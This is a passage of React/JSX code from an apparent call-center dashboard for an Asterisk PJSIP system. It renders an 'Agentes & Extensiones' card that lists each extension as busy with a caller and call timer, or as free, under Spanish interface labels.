                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                  </select>
                </div>
              ))}
            </div>
          </div>

          {/* Card 2: Estado de Agentes & Extensiones PJSIP */}
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Users className="w-4 h-4 text-emerald-400" />
                <span>Agentes & Extensiones</span>
              </h3>
              <span className="text-[10px] text-emerald-400 font-mono font-bold">
                {extensions.length} Extensiones
              </span>
            </div>

            <div className="space-y-2">
              {extensions.map((ext) => {
                const callWithAgent = liveCalls.find((c) => c.agent === ext.extension && c.status !== 'ended');
                const isBusy = !!callWithAgent;

                return (
                  <div
                    key={ext.id || ext.extension}
                    className={`p-2.5 rounded-xl border flex items-center justify-between text-xs transition-all ${
                      isBusy
                        ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-300'
                        : 'bg-slate-950 border-slate-800/80 text-slate-300'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <div
                        className={`w-7 h-7 rounded-lg flex items-center justify-center font-mono font-bold text-xs ${
                          isBusy ? 'bg-emerald-500 text-slate-950' : 'bg-slate-800 text-slate-400'
                        }`}
                      >
                        {ext.extension}
                      </div>
                      <div>
                        <div className="font-bold text-white">{ext.name}</div>
                        <div className="text-[10px] text-slate-400 font-mono">
                          {isBusy ? `Con cliente: ${callWithAgent.number}` : 'Disponible'}
                        </div>
                      </div>
                    </div>

                    <div>
                      {isBusy ? (
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 animate-pulse">
                          {formatDuration(callWithAgent.duration)}
                        </span>
                      ) : (
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-slate-800 text-slate-400">
                          Libre
                        </span>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
